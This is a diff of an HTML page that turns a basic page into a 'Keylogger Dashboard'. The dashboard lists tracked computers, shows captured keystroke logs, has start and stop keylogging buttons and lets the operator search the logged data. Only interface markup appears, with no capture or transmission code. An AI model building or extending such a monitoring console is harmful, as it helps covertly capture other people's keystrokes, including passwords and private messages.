@@ -3,26 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-    <link rel="stylesheet" href="./index.css">
+    <title>Keylogger Dashboard</title>
+    <link rel="stylesheet" href="index.css">
+    <script defer src="index.js"></script>
 </head>
 <body>
-    
-
     <div class="container">
-        <h1>Keylogger Control</h1>
-        <button id="startBtn">Start Listening</button>
-        <button id="stopBtn">Stop Listening</button>
-        <div id="status"></div>
+        <div class="sidebar">
+            <h2>Tracked Computers</h2>
+            <select id="computer-list" class="dropdown" onchange="fetchData()">
+                <option value="">Select a tracked computer</option>
+            </select>
+        </div>
+        <div class="content">
+            <h1 id="main-message">Select a tracked computer</h1>
+            <h1 id="recordingStatus" class="hidden">
+                Recording in progress <span id="recordingIcon">🔴</span>
+            </h1>
+            <div class="log-content" id="log-content"></div>
+            <div class="search-box-container">
+                <div id="content_button"> <button class="action-btn stop-btn" onclick="stopKeylogger()">⏸ Stop Keylogging</button>
+                    <button class="action-btn start-btn" onclick="startKeylogger()">🔴 Start Keylogging</button></div>
+                
+                <input type="text" class="search-box" placeholder="Search in keylogger data..." oninput="searchContent(this.value)">
+            </div>
+        </div>
     </div>
-
-
-
-
-
-
-
-
-    <script src="./index.js"></script>
 </body>
 </html>
